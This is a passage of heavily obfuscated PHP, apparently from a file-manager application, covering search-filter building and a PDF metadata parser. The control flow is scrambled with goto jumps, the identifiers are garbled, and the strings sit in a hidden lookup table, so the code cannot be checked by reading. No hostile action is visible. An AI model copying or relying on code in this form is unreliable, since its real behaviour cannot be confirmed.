$c‚º§µ¼—½[84]), $c‚º§µ¼—½[33], $c‚º§µ¼—½[366]); $fíÊ¨‡‚ñœ = array_merge($fíÊ¨‡‚ñœ, array_to_keyvalue($eÑÈÓ“¶Œ, $c‚º§µ¼—½[33], $c‚º§µ¼—½[366])); goto fŠ›Ä†øƒ…; fŠ›Ä†øƒ…: if (!$e‚†´¬äÈ) { return $fíÊ¨‡‚ñœ; } $D…†öÃ©°¾ = array($c‚º§µ¼—½[457] => array($c‚º§µ¼—½[7], $e‚†´¬äÈ)); $eÑÈÓ“¶Œ = $this->field($c‚º§µ¼—½[2215])->where($D…†öÃ©°¾)->select(); goto aƒ†ˆ‚Ã; fŒ¦²§ŞŒÄ: $c‚º§µ¼—½ =& $_SERVER[ì‹É]; $fíÊ¨‡‚ñœ = array(); $D…†öÃ©°¾ = array($c‚º§µ¼—½[457] => $a²£òêèİ); goto fé³òÇÙ…Ò; aƒ†ˆ‚Ã: $fíÊ¨‡‚ñœ = array_merge($fíÊ¨‡‚ñœ, array_to_keyvalue($eÑÈÓ“¶Œ, $c‚º§µ¼—½[33], $c‚º§µ¼—½[366])); $fíÊ¨‡‚ñœ = array_slice($fíÊ¨‡‚ñœ, 0, $C“¿—Ê¸­á); return $fíÊ¨‡‚ñœ; goto d½ê«í‚ÈÊ; d½ê«í‚ÈÊ: } private function _listSearchBindPinyin($eÖ£Ñ½º±¥, &$bÂ‘İ¸ÓÓ¨, &$aè®ÉƒÏ„˜) { goto Cäº†”ñ; DÂ¹·ÅÈ: $d´æéãáí¥[] = array($c …§³¶è•[2219] => $B£®Ï÷¿Û, $c …§³¶è•[911] => $c …§³¶è•[2096], array($c …§³¶è•[2220] => $B£®Ï÷¿Û, $c …§³¶è•[2221] => array($c …§³¶è•[7], array($c …§³¶è•[412], $c …§³¶è•[411])))); $this->join($b’ää«Œã…); $bÂ‘İ¸ÓÓ¨ = $d´æéãáí¥; goto eòùİˆ–“; f×²¿â•¬: unset($bÂ‘İ¸ÓÓ¨[$c …§³¶è•[28]]); foreach ($bÂ‘İ¸ÓÓ¨ as $c‘ˆÉÆêğ => $F¦‘â÷¬ƒ) { $d´æéãáí¥[$c …§³¶è•[2217] . $c‘ˆÉÆêğ] = $F¦‘â÷¬ƒ; } $B£®Ï÷¿Û = array($c …§³¶è•[475], $c …§³¶è•[2094] . $eÖ£Ñ½º±¥[$c …§³¶è•[2092]] . $c …§³¶è•[2094]); goto DÂ¹·ÅÈ; Cäº†”ñ: $c …§³¶è• =& $_SERVER[ì‹É]; if (!Input::check($eÖ£Ñ½º±¥[$c …§³¶è•[2092]], $c …§³¶è•[303]) || strlen($eÖ£Ñ½º±¥[$c …§³¶è•[2092]]) < 2) { return; } $b’ää«Œã… = "\114\105\x46\124\x20\112\117\x49\116\x20{$this->tablePrefix}\151\x6f\x5f\x73\x6f\x75\x72\143\x65\x5f\x6d\x65\x74\x61\x20\155\145\x74\x61\x20\x6f\156\x20\x73\x6f\x75\162\143\x65\56\163\157\x75\x72\143\x65\x49\x44\40\75\40\x6d\145\x74\141\56\x73\x6f\x75\x72\143\145\x49\104"; goto A“àŠÓ„¦; A“àŠÓ„¦: $d´æéãáí¥ = array(); $aè®ÉƒÏ„˜ = str_replace(array($c …§³¶è•[214], $c …§³¶è•[50], $c …§³¶è•[2216]), $c …§³¶è•[33], $aè®ÉƒÏ„˜); $aè®ÉƒÏ„˜ = $c …§³¶è•[2217] . str_replace($c …§³¶è•[47], $c …§³¶è•[2218], $aè®ÉƒÏ„˜); goto f×²¿â•¬; eòùİˆ–“: } private function _parseSearchWhere($E¸‚õø’˜§) { goto dãÓ±£º‹; dãÓ±£º‹: $B©ÕÆŠ™Ã =& $_SERVER[ì‹É]; $F—ó§–¨ğ = array(); if (isset($E¸‚õø’˜§[$B©ÕÆŠ™Ã[689]])) { $F—ó§–¨ğ[$B©ÕÆŠ™Ã[108]] = array($B©ÕÆŠ™Ã[2222], $E¸‚õø’˜§[$B©ÕÆŠ™Ã[689]]); } goto c¢—¥«ºß; e‘§êå¦»Í: if (isset($E¸‚õø’˜§[$B©ÕÆŠ™Ã[2092]]) && $E¸‚õø’˜§[$B©ÕÆŠ™Ã[2092]]) { $AÄâò¹é = $E¸‚õø’˜§[$B©ÕÆŠ™Ã[2092]]; $Cğ©åÇˆ¥Ê = explode($B©ÕÆŠ™Ã[50], $AÄâò¹é); if (strlen($AÄâò¹é) > 2 && (substr($AÄâò¹é, 0, 1) == $B©ÕÆŠ™Ã[114] && substr($AÄâò¹é, -1) == $B©ÕÆŠ™Ã[114]) || substr($AÄâò¹é, 0, 1) == $B©ÕÆŠ™Ã[55] && substr($AÄâò¹é, -1) == $B©ÕÆŠ™Ã[55]) { $AÄâò¹é = substr($AÄâò¹é, 1, -1); $Cğ©åÇˆ¥Ê = array($AÄâò¹é); } $F—ó§–¨ğ[$B©ÕÆŠ™Ã[28]] = array($B©ÕÆŠ™Ã[475], $B©ÕÆŠ™Ã[2094] . $AÄâò¹é . $B©ÕÆŠ™Ã[2094]); if (count($Cğ©åÇˆ¥Ê) > 1) { $F—ó§–¨ğ[$B©ÕÆŠ™Ã[28]] = array(); foreach ($Cğ©åÇˆ¥Ê as $a„Œ¼µ¼Œì) { if (!trim($a„Œ¼µ¼Œì)) { continue; } $F—ó§–¨ğ[$B©ÕÆŠ™Ã[28]][] = array($B©ÕÆŠ™Ã[475], $B©ÕÆŠ™Ã[2094] . trim($a„Œ¼µ¼Œì) . $B©ÕÆŠ™Ã[2094]); } } } return $F—ó§–¨ğ; goto aì‚··§½; dº§µÙ†: if (isset($E¸‚õø’˜§[$B©ÕÆŠ™Ã[527]])) { $F—ó§–¨ğ[] = array($B©ÕÆŠ™Ã[376] => $E¸‚õø’˜§[$B©ÕÆŠ™Ã[527]], $B©ÕÆŠ™Ã[375] => $E¸‚õø’˜§[$B©ÕÆŠ™Ã[527]], $B©ÕÆŠ™Ã[911] => $B©ÕÆŠ™Ã[2096]); } if (isset($E¸‚õø’˜§[$B©ÕÆŠ™Ã[369]])) { $Dà¤Ø•²¬† = $E¸‚õø’˜§[$B©ÕÆŠ™Ã[369]]; if ($Dà¤Ø•²¬† == $B©ÕÆŠ™Ã[77]) { $F—ó§–¨ğ[$B©ÕÆŠ™Ã[367]] = 1; } else { if ($Dà¤Ø•²¬† == $B©ÕÆŠ™Ã[2227]) { $F—ó§–¨ğ[$B©ÕÆŠ™Ã[367]] = 0; } else { if ($Dà¤Ø•²¬†) { $Dà¤Ø•²¬† = is_array($Dà¤Ø•²¬†) ? $Dà¤Ø•²¬† : explode($B©ÕÆŠ™Ã[47], $Dà¤Ø•²¬†); $F—ó§–¨ğ[$B©ÕÆŠ™Ã[369]] = array($B©ÕÆŠ™Ã[381], $Dà¤Ø•²¬†); $F—ó§–¨ğ[$B©ÕÆŠ™Ã[367]] = 0; } } } } if (isset($E¸‚õø’˜§[$B©ÕÆŠ™Ã[457]])) { $FŠìÍŠéµæ = $this->sourceInfo($E¸‚õø’˜§[$B©ÕÆŠ™Ã[457]]); $F—ó§–¨ğ[$B©ÕÆŠ™Ã[517]] = array($B©ÕÆŠ™Ã[475], $FŠìÍŠéµæ[$B©ÕÆŠ™Ã[455]] . $E¸‚õø’˜§[$B©ÕÆŠ™Ã[457]] . $B©ÕÆŠ™Ã[476]); } goto e‘§êå¦»Í; c¢—¥«ºß: if (isset($E¸‚õø’˜§[$B©ÕÆŠ™Ã[690]])) { $f²¯ç¾À¦¾ = array($B©ÕÆŠ™Ã[2223], $E¸‚õø’˜§[$B©ÕÆŠ™Ã[690]]); if ($F—ó§–¨ğ[$B©ÕÆŠ™Ã[108]]) { $F—ó§–¨ğ[$B©ÕÆŠ™Ã[108]] = array($F—ó§–¨ğ[$B©ÕÆŠ™Ã[108]], $f²¯ç¾À¦¾, $B©ÕÆŠ™Ã[2224]); } else { $F—ó§–¨ğ[$B©ÕÆŠ™Ã[108]] = $f²¯ç¾À¦¾; } } if (isset($E¸‚õø’˜§[$B©ÕÆŠ™Ã[2225]])) { $F—ó§–¨ğ[$B©ÕÆŠ™Ã[78]] = array($B©ÕÆŠ™Ã[2222], $E¸‚õø’˜§[$B©ÕÆŠ™Ã[2225]]); } if (isset($E¸‚õø’˜§[$B©ÕÆŠ™Ã[2226]])) { $f²¯ç¾À¦¾ = array($B©ÕÆŠ™Ã[2223], $E¸‚õø’˜§[$B©ÕÆŠ™Ã[2226]]); if ($F—ó§–¨ğ[$B©ÕÆŠ™Ã[78]]) { $F—ó§–¨ğ[$B©ÕÆŠ™Ã[78]] = array($F—ó§–¨ğ[$B©ÕÆŠ™Ã[78]], $f²¯ç¾À¦¾, $B©ÕÆŠ™Ã[2224]); } else { $F—ó§–¨ğ[$B©ÕÆŠ™Ã[78]] = $f²¯ç¾À¦¾; } } goto dº§µÙ†; aì‚··§½: } } goto cíëŒŞ•çí; eµß†¾øÓÔ: class FileParsePdf { public static function parse($d¢¥Şƒ˜õÓ) { goto eéğèôœÍÓ; FÜµ¦ â«ä: if ($e°ŠÀÅ‡Ğñ) { $dà©äĞ«Ù = $e°ŠÀÅ‡Ğñ[$Dó·§£ñí´[1444]][$Dó·§£ñí´[1157]]; $cöï¯š´®É = self::getObjectValue($dÈ³›â™§, $e°ŠÀÅ‡Ğñ, $dà©äĞ«Ù); } $cöï¯š´®É = is_array($cöï¯š´®É) ? $cöï¯š´®É : array(); $cöï¯š´®É[$Dó·§£ñí´[1445]] = 0; goto f›ÌÛÊ‚øœ; D¹±£µˆÕ: if ($Dƒ‚†¦†ñ[1] && $cöï¯š´®É[$Dó·§£ñí´[1449]] < $Dƒ‚†¦†ñ[1][0]) { $cöï¯š´®É[$Dó·§£ñí´[1449]] = $Dƒ‚†¦†ñ[1][0]; } $cöï¯š´®É = self::parseInfoItem($cöï¯š´®É); return $cöï¯š´®É; goto cÛÙ‘°†‹; aìğ–›°ö: $dÈ³›â™§[$Dó·§£ñí´[1442]] = StreamWrapperIO::read($d¢¥Şƒ˜õÓ, 0, $DÄ‘ÜÄ‰¦×); $dÈ³›â™§[$Dó·§£ñí´[1443]] = StreamWrapperIO::read($d¢¥Şƒ˜õÓ, $dÈ³›â™§[$Dó·§£ñí´[78]] - $DÄ‘ÜÄ‰¦×, $DÄ‘ÜÄ‰¦×); $e°ŠÀÅ‡Ğñ = self::decodeXref($dÈ³›â™§); goto FÜµ¦ â«ä; bÆ­ñ°Àùª: preg_match($E…¿‡­¬, $dÈ³›â™§[$Dó·§£ñí´[1443]], $Dƒ‚†¦†ñ); if (!$cöï¯š´®É[$Dó·§£ñí´[1445]] && count($Dƒ‚†¦†ñ) == 5) { $cöï¯š´®É[$Dó·§£ñí´[1445]] = $Dƒ‚†¦†ñ[3]; $cöï¯š´®É[$Dó·§£ñí´[1447]] = $Dƒ‚†¦†ñ[4]; } preg_match($Dó·§£ñí´[1448], $dÈ³›â™§[$Dó·§£ñí´[1442]], $Dƒ‚†¦†ñ); goto F¬ñâ¡ á; F¬ñâ¡ á: if ($Dƒ‚†¦†ñ) { $cöï¯š´®É[$Dó·§£ñí´[1247]] = $Dƒ‚†¦†ñ[1]; } $cöï¯š´®É[$Dó·§£ñí´[1449]] = 0; $E…¿‡­¬ = $Dó·§£ñí´[1450]; goto aõƒÁ‘†‡´; aõƒÁ‘†‡´: preg_match_all($E…¿‡­¬, $dÈ³›â™§[$Dó·§£ñí´[1442]], $Dƒ‚†¦†ñ); if ($Dƒ‚†¦†ñ[1] && $cöï¯š´®É[$Dó·§£ñí´[1449]] < $Dƒ‚†¦†ñ[1][0]) { $cöï¯š´®É[$Dó·§£ñí´[1449]] = $Dƒ‚†¦†ñ[1][0]; } preg_match_all($E…¿‡­¬, $dÈ³›â™§[$Dó·§£ñí´[1443]], $Dƒ‚†¦†ñ); goto D¹±£µˆÕ; f›ÌÛÊ‚øœ: $E…¿‡­¬ = $Dó·§£ñí´[1446]; preg_match($E…¿‡­¬, $dÈ³›â™§[$Dó·§£ñí´[1442]], $Dƒ‚†¦†ñ); if (!$cöï¯š´®É[$Dó·§£ñí´[1445]] && count($Dƒ‚†¦†ñ) == 5) { $cöï¯š´®É[$Dó·§£ñí´[1445]] = $Dƒ‚†¦†ñ[3]; $cöï¯š´®É[$Dó·§£ñí´[1447]] = $Dƒ‚†¦†ñ[4]; } goto bÆ­ñ°Àùª; eéğèôœÍÓ: $Dó·§£ñí´ =& $_SERVER[ì‹É]; $DÄ‘ÜÄ‰¦× = 32 * 1024; $dÈ³›â™§ = array($Dó·§£ñí´[779] => fopen($d¢¥Şƒ˜õÓ, $Dó·§£ñí´[1134]), $Dó·§£ñí´[76] => $d¢¥Şƒ˜õÓ, $Dó·§£ñí´[78] => filesize($d¢¥Şƒ˜õÓ), $Dó·§£ñí´[1441] => $DÄ‘ÜÄ‰¦×); goto aìğ–›°ö; cÛÙ‘°†‹: } private static function parseInfoItem($E±‡ ‹³‚) { $d²Ç«í†²Å =& $_SERVER[ì‹É]; if (!$E±‡ ‹³‚) { return !1; } $b…¢ÂªŠ×± = array($d²Ç«í†²Å[1248] => array($d²Ç«í†²Å[1451], $d²Ç«í†²Å[33]), $d²Ç«í†²Å[1452] => array($d²Ç«í†²Å[1453], $d²Ç«í†²Å[33]), $d²Ç«í†²Å[184] => array($d²Ç«í†²Å[1454], $d²Ç«í†²Å[207]), $d²Ç«í†²Å[108] => array($d²Ç«í†²Å[1455], $d²Ç«í†²Å[207]), $d²Ç«í†²Å[1449] => array($d²Ç«í†²Å[1449], $d²Ç«í†²Å[273]), $d²Ç«í†²Å[1445] => array($d²Ç«í†²Å[1445], $d²Ç«í†²Å[273]), $d²Ç«í†²Å[1447] => array($d²Ç«í†²Å[1447], $d²Ç«í†²Å[273]), $d²Ç«í†²Å[1456] => array($d²Ç«í†²Å[1457], $d²Ç«í†²Å[33]), $d²Ç«í†²Å[1458] => array($d²Ç«í†²Å[1459], $d²Ç«í†²Å[33]), $d²Ç«í†²Å[1460] => array($d²Ç«í†²Å[1247], $d²Ç«í†²Å[33])); $A³ªêîËÃÅ = array(); foreach ($b…¢ÂªŠ×± as $F¿‰¸§®Ä­ => $bİ¡Œ‹‘˜Ş) { if (!isset($E±‡ ‹³‚[$bİ¡Œ‹‘˜Ş[0]])) { continue; } $fäÑ³ÁÂ‚å = $E±‡ ‹³‚[$bİ¡Œ‹‘˜Ş[0]]; if (!$fäÑ³ÁÂ‚å || is_array($fäÑ³ÁÂ‚å)) { continue; } switch ($bİ¡Œ‹‘˜Ş[1]) { case $d²Ç«í†²Å[273]: $fäÑ³ÁÂ‚å = intval($fäÑ³ÁÂ‚å); break; case $d²Ç«í†²Å[207]: if (substr($fäÑ³ÁÂ‚å, 0, 2) == $d²Ç«í†²Å[1461]) { $fäÑ³ÁÂ‚å = substr($fäÑ³ÁÂ‚å, 2, 14); } if (strtotime($fäÑ³ÁÂ‚å)) { $fäÑ³ÁÂ‚å = date($d²Ç«í†²Å[1462], strtotime($fäÑ³ÁÂ‚å)); } break; } $A³ªêîËÃÅ[$F¿‰¸§®Ä­] = $fäÑ³ÁÂ‚å; } return $A³ªêîËÃÅ; } private static function decodeXref(&$E“ªÈ¶Èß) { goto EÛ‹ÖàÔ°È; EÛ‹ÖàÔ°È: $bÆ»ª¬ëò =& $_SERVER[ì‹É]; $cö°‚•‹Ã¯ = $E“ªÈ¶Èß[$bÆ»ª¬ëò[1443]]; $C„Ñ›§ĞŠ“ = array($bÆ»ª¬ëò[1444] => array(), $bÆ»ª¬ëò[1463] => array()); goto c¼ÁœŸÕ ; dŞš»ù±×: foreach ($b×ÚÛ½ùÀˆ[3] as $aïŞ†‹Òí => $FŒæ¯Ÿˆ³) { if ($b×ÚÛ½ùÀˆ[3][$aïŞ†‹Òí] == $bÆ»ª¬ëò[1466]) { $DÈ˜ã­ŠÁ  = $CĞÈœ£»ëè . $bÆ»ª¬ëò[71] . intval($b×ÚÛ½ùÀˆ[2][$aïŞ†‹Òí]); $C„Ñ›§ĞŠ“[$bÆ»ª¬ëò[1463]][$DÈ˜ã­ŠÁ ] = intval($b×ÚÛ½ùÀˆ[1][$aïŞ†‹Òí]); ++$CĞÈœ£»ëè; } else { if ($b×ÚÛ½ùÀˆ[3][$aïŞ†‹Òí] == $bÆ»ª¬ëò[1467]) { ++$CĞÈœ£»ëè; } else { } } } if (preg_match_all($bÆ»ª¬ëò[1468], $cö°‚•‹Ã¯, $b×ÚÛ½ùÀˆ)) { $CÜ›˜Óñ = $E“ªÈ¶Èß[$bÆ»ª¬ëò[78]] - $E“ªÈ¶Èß[$bÆ»ª¬ëò[1441]]; foreach ($b×ÚÛ½ùÀˆ[0] as $aïŞ†‹Òí => $D”Í“—œì¬) { $Cà¸ëñ½ñ˜ = $b×ÚÛ½ùÀˆ[1][$aïŞ†‹Òí] . $bÆ»ª¬ëò[71] . $b×ÚÛ½ùÀˆ[2][$aïŞ†‹Òí]; $C„Ñ›§ĞŠ“[$bÆ»ª¬ëò[1463]][$Cà¸ëñ½ñ˜] = strpos($cö°‚•‹Ã¯, $D”Í“—œì¬) + $CÜ›˜Óñ + 1; } } if (preg_match_all($bÆ»ª¬ëò[1469], $cö°‚•‹Ã¯, $b×ÚÛ½ùÀˆ)) { $DôîÎğ¡Ó… = count($b×ÚÛ½ùÀˆ[1]) == 1 ? $b×ÚÛ½ùÀˆ[1][0] : $b×ÚÛ½ùÀˆ[1][1]; } else { $DôîÎğ¡Ó… = substr($cö°‚•‹Ã¯, -1024 * 5); } goto Aö¾ÜéÃÄ; Aö¾ÜéÃÄ: if (preg_match($bÆ»ª¬ëò[1470], $DôîÎğ¡Ó…, $b×ÚÛ½ùÀˆ) > 0) { $C„Ñ›§ĞŠ“[$bÆ»ª¬ëò[1444]][$bÆ»ª¬ëò[78]] = intval($b×ÚÛ½ùÀˆ[1]); } if (preg_match($bÆ»ª¬ëò[1471], $DôîÎğ¡Ó…, $b×ÚÛ½ùÀˆ) > 0) { $C„Ñ›§ĞŠ“[$bÆ»ª¬ëò[1444]][$bÆ»ª¬ëò[1472]] = intval($b×ÚÛ½ùÀˆ[1]) . $bÆ»ª¬ëò[71] . intval($b×ÚÛ½ùÀˆ[2]); } if (preg_match($bÆ»ª¬ëò[1473], $DôîÎğ¡Ó…, $b×ÚÛ½ùÀˆ) > 0) { $C„Ñ›§ĞŠ“[$bÆ»ª¬ëò[1444]][$bÆ»ª¬ëò[1474]] = intval($b×ÚÛ½ùÀˆ[1]) . $bÆ»ª¬ëò[71] . intval($b×ÚÛ½ùÀˆ[2]); } goto a¦¤‚›…´Ú; c¼ÁœŸÕ : $A¦ØÆ„¡«™ = $bÆ»ª¬ëò[1464]; if (!preg_match_all($A¦ØÆ„¡«™, $cö°‚•‹Ã¯, $b×ÚÛ½ùÀˆ, PREG_SET_ORDER, 0)) { return !1; } $B†ÒùêØİ = intval($b×ÚÛ½ùÀˆ[0][1]); goto aÄì®—í¶; bÎí™¤‡øó: if (preg_match($bÆ»ª¬ëò[1477], $DôîÎğ¡Ó…, $b×ÚÛ½ùÀˆ) > 0) { } return $C„Ñ›§ĞŠ“; goto A›è”æ°††; aÄì®—í¶: if ($E“ªÈ¶Èß[$bÆ»ª¬ëò[78]] - $B†ÒùêØİ > $E“ªÈ¶Èß[$bÆ»ª¬ëò[1441]]) { $Dƒ¾Ÿí­äß = 4 * $E“ªÈ¶Èß[$bÆ»ª¬ëò[1441]]; $E“ªÈ¶Èß[$bÆ»ª¬ëò[1441]] = $Dƒ¾Ÿí­äß; $E“ªÈ¶Èß[$bÆ»ª¬ëò[1442]] = StreamWrapperIO::read($E“ªÈ¶Èß[$bÆ»ª¬ëò[76]], 0, $Dƒ¾Ÿí­äß); $E“ªÈ¶Èß[$bÆ»ª¬ëò[1443]] = StreamWrapperIO::read($E“ªÈ¶Èß[$bÆ»ª¬ëò[76]], $E“ªÈ¶Èß[$bÆ»ª¬ëò[78]] - $Dƒ¾Ÿí­äß, $Dƒ¾Ÿí­äß); $cö°‚•‹Ã¯ = $E“ªÈ¶Èß[$bÆ»ª¬ëò[1443]]; } $CĞÈœ£»ëè = 0; preg_match_all($bÆ»ª¬ëò[1465], $cö°‚•‹Ã¯, $b×ÚÛ½ùÀˆ); goto dŞš»ù±×; a¦¤‚›…´Ú: if (preg_match($bÆ»ª¬ëò[1475], $DôîÎğ¡Ó…, $b×ÚÛ½ùÀˆ) > 0) { $C„Ñ›§ĞŠ“[$bÆ»ª¬ëò[1444]][$bÆ»ª¬ëò[1157]] = intval($b×ÚÛ½ùÀˆ[1]) . $bÆ»ª¬ëò[71] . intval($b×ÚÛ½ùÀˆ[2]); } if (preg_match($bÆ»ª¬ëò[1476], $DôîÎğ¡Ó…, $b×ÚÛ½ùÀˆ) > 0) { $C„Ñ›§ĞŠ“[$bÆ»ª¬ëò[1444]][$bÆ»ª¬ëò[364]] = array(); $C„Ñ›§ĞŠ“[$bÆ»ª¬ëò[1444]][$bÆ»ª¬ëò[364]][0] = $b×ÚÛ½ùÀˆ[1]; $C„Ñ›§ĞŠ“[$bÆ»ª¬ëò[1444]][$bÆ»ª¬ëò[364]][1] = $b×ÚÛ½ùÀˆ[2]; } if (!$C„Ñ›§ĞŠ“[$bÆ»ª¬ëò[1444]][$bÆ»ª¬ëò[1157]]) { return !1; } goto bÎí™¤‡øó; A›è”æ°††: } private static function getObjectValue($Bé…¿ã‹ÃÆ, $dµê‰ªä, $dªÄ ›²¥Ÿ) { goto C£Î¡¼‰Ö; a›˜ãôâ•ò: if (!is_array($Fò‚¤ö˜¯‚[1])) { return array(); } $eáŒ—ä¨ø = array(); for ($F¿ªÏŸ¼„ = 0; $F¿ªÏŸ¼„ < count($Fò‚¤ö˜¯‚[1]); $F¿ªÏŸ¼„ += 2) { $f§œøØáÃÍ = $Fò‚¤ö˜¯‚[1][$F¿ªÏŸ¼„]; $cïÁŒÉÜ± = $Fò‚¤ö˜¯‚[1][$F¿ªÏŸ¼„ + 1]; if (count($f§œøØáÃÍ) == 3 && $f§œøØáÃÍ[0] == $CìÆÀÃÃóİ[8]) { $Bñ¨âë¶œ = !1; if ($cïÁŒÉÜ±[0] == $CìÆÀÃÃóİ[1478]) { $cïÁŒÉÜ± = self::getObject($Bé…¿ã‹ÃÆ, $dµê‰ªä[$CìÆÀÃÃóİ[1463]][$cïÁŒÉÜ±[1]]); } $Bñ¨âë¶œ = $cïÁŒÉÜ±[1]; if ($Bñ¨âë¶œ === !1) { continue; } if (is_string($Bñ¨âë¶œ)) { $Bñ¨âë¶œ = self::decodeStr($Bñ¨âë¶œ); } $eáŒ—ä¨ø[$f§œøØáÃÍ[1]] = $Bñ¨âë¶œ; } } goto cÕº§¬¾ì; C£Î¡¼‰Ö: $CìÆÀÃÃóİ =& $_SERVER[ì‹É]; $Fò‚¤ö˜¯‚ = self::getObject($Bé…¿ã‹ÃÆ, $dµê‰ªä[$CìÆÀÃÃóİ[1463]][$dªÄ ›²¥Ÿ]); if (is_string($Fò‚¤ö˜¯‚[1])) { return $Fò‚¤ö˜¯‚[1]; } goto a›˜ãôâ•ò; cÕº§¬¾ì: return $eáŒ—ä¨ø; goto AÌ‰›¸Ü¤; AÌ‰›¸Ü¤: } private static function getObject($EÂğ‘Òù’, $d˜¶„˜çã) { $F÷‘ïÈĞíŒ = self::getObjectItem($EÂğ‘Òù’, $d˜¶„˜çã); $F÷‘ïÈĞíŒ = self::getObjectItem($EÂğ‘Òù’, $F÷‘ïÈĞíŒ[2]); return $F÷‘ïÈĞíŒ; } private static function getObjectItem($dö ‘›“„Ê, $d–Ëçà«Áæ) { goto d¹ªšÅõî; F‹ÔÄªñ¨: $dˆâáÊ¡ñß = self::getRawObject($a÷¦‚®ñ², $f¼ŒìÕ‘ßù); if ($d–Ëçà«Áæ >= $Cö™ôæ¡„) { $dˆâáÊ¡ñß[2] = $dˆâáÊ¡ñß[2] + $Cö™ôæ¡„; } else { if ($d–Ëçà«Áæ > $cÍºø÷ğĞÇ && $d–Ëçà«Áæ <= $Cö™ôæ¡„) { $dˆâáÊ¡ñß[2] = $dˆâáÊ¡ñß[2] + $d–Ëçà«Áæ; } } return $dˆâáÊ¡ñß; goto Eãó’¬š³§; B’‡Ñ”‚„À: $f¼ŒìÕ‘ßù = $d–Ëçà«Áæ >= $Cö™ôæ¡„ ? $d–Ëçà«Áæ - $Cö™ôæ¡„ : $d–Ëçà«Áæ; $a÷¦‚®ñ² = $d–Ëçà«Áæ >= $Cö™ôæ¡„ ? $dö ‘›“„Ê[$eÔõ•õ„ŒØ[1443]] : $dö ‘›“„Ê[$eÔõ•õ„ŒØ[1442]]; if ($d–Ëçà«Áæ > $cÍºø÷ğĞÇ && $d–Ëçà«Áæ <= $Cö™ôæ¡„) { $f¼ŒìÕ‘ßù = 0; $a÷¦‚®ñ² = StreamWrapperIO::read($dö ‘›“„Ê[$eÔõ•õ„ŒØ[76]], $d–Ëçà«Áæ, $cÍºø÷ğĞÇ); } goto F‹ÔÄªñ¨; d¹ªšÅõî: $eÔõ•õ„ŒØ =& $_SERVER[ì‹É]; $cÍºø÷ğĞÇ = $dö ‘›“„Ê[$eÔõ•õ„ŒØ[1441]]; $Cö™ôæ¡„ = $dö ‘›“„Ê[$eÔõ•õ„ŒØ[78]] - $cÍºø÷ğĞÇ; goto B’‡Ñ”‚„À; Eãó’¬š³§: } private static function decodeStr($d™»º½Œ¢) { goto c¯—Úø¥Ï; eÅÁ—†é: return $d™»º½Œ¢; goto DºÌí¶ïâÕ; Fî¶—œğŞ×: $d™»º½Œ¢ = $Fš‚©•Ğ˜«[33]; foreach ($B‡…ğò¾†æ as $cóÑªìÒ¥ˆ) { if (preg_match($Fš‚©•Ğ˜«[1493], $cóÑªìÒ¥ˆ) && !1 === stripos($cóÑªìÒ¥ˆ, $Fš‚©•Ğ˜«[1494])) { $cóÑªìÒ¥ˆ = preg_replace($Fš‚©•Ğ˜«[1495], $Fš‚©•Ğ˜«[33], $cóÑªìÒ¥ˆ); $cóÑªìÒ¥ˆ = trim($cóÑªìÒ¥ˆ, $Fš‚©•Ğ˜«[923]); $cóÑªìÒ¥ˆ = pack($Fš‚©•Ğ˜«[1496], $cóÑªìÒ¥ˆ); $d™»º½Œ¢ .= $cóÑªìÒ¥ˆ; } else { $d™»º½Œ¢ .= $cóÑªìÒ¥ˆ; } } if (preg_match($Fš‚©•Ğ˜«[1497], $d™»º½Œ¢)) { $fèÆæ©İçª = substr($d™»º½Œ¢, 2); $d™»º½Œ¢ = $Fš‚©•Ğ˜«[33]; $A¬³˜Ùòò‰ = strlen($fèÆæ©İçª); for ($d“Ó†¿÷ƒ¥ = 0; $d“Ó†¿÷ƒ¥ < $A¬³˜Ùòò‰; $d“Ó†¿÷ƒ¥ += 2) { $Eº‹½ô‘Š = hexdec(bin2hex(substr($fèÆæ©İçª, $d“Ó†¿÷ƒ¥, 2))); $d™»º½Œ¢ .= mb_convert_encoding($Fš‚©•Ğ˜«[1498] . intval($Eº‹½ô‘Š) . $Fš‚©•Ğ˜«[68], $Fš‚©•Ğ˜«[1499], $Fš‚©•Ğ˜«[1500]); } } goto eÅÁ—†é; c¯—Úø¥Ï: $Fš‚©•Ğ˜« =& $_SERVER[ì‹É]; $d™»º½Œ¢ = str_replace(array($Fš‚©•Ğ˜«[1479], $Fš‚©•Ğ˜«[1480], $Fš‚©•Ğ˜«[1481], $Fš‚©•Ğ˜«[1482], $Fš‚©•Ğ˜«[1483], $Fš‚©•Ğ˜«[1484], $Fš‚©•Ğ˜«[1485], $Fš‚©•Ğ˜«[1486]), array($Fš‚©•Ğ˜«[96], $Fš‚©•Ğ˜«[50], $Fš‚©•Ğ˜«[8], $Fš‚©•Ğ˜«[245], $Fš‚©•Ğ˜«[813], $Fš‚©•Ğ˜«[214], $Fš‚©•Ğ˜«[716], $Fš‚©•Ğ˜«[327]), $d™»º½Œ¢); $B‡…ğò¾†æ = preg_split($Fš‚©•Ğ˜«[1487], $d™»º½Œ¢, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto a…ŠÄÈÕ—; a…ŠÄÈÕ—: $d™»º½Œ¢ = $Fš‚©•Ğ˜«[33]; foreach ($B‡…ğò¾†æ as $cóÑªìÒ¥ˆ) { if (preg_match($Fš‚©•Ğ˜«[1488], $cóÑªìÒ¥ˆ)) { $d™»º½Œ¢ .= \chr(octdec(trim($cóÑªìÒ¥ˆ, $Fš‚©•Ğ˜«[96]))); } else { $d™»º½Œ¢ .= $cóÑªìÒ¥ˆ; } } $B‡…ğò¾†æ = preg_split($Fš‚©•Ğ˜«[1489], $d™»º½Œ¢, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto C¥ŸØã…Ç; C¥ŸØã…Ç: $d™»º½Œ¢ = $Fš‚©•Ğ˜«[33]; foreach ($B‡…ğò¾†æ as $cóÑªìÒ¥ˆ) { if (preg_match($Fš‚©•Ğ˜«[1490], $cóÑªìÒ¥ˆ)) { $d™»º½Œ¢ .= \chr(hexdec(trim($cóÑªìÒ¥ˆ, $Fš‚©•Ğ˜«[1491]))); } else { $d™»º½Œ¢ .= $cóÑªìÒ¥ˆ; } } $B‡…ğò¾†æ = preg_split($Fš‚©•Ğ˜«[1492], $d™»º½Œ¢, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto Fî¶—œğŞ×; DºÌí¶ïâÕ: } private static function getRawObject($f³óæš¿İ, $A‡Ç½˜ĞÍì = 0) { goto dôßÄ”ÜÏÙ; cÉÂÊƒò¦¢: return array($aƒ¼ÃÕ ÖÍ, $AñŞÔÈ±Ñ, $A‡Ç½˜ĞÍì); goto FÜ©ìÛ½Ü; 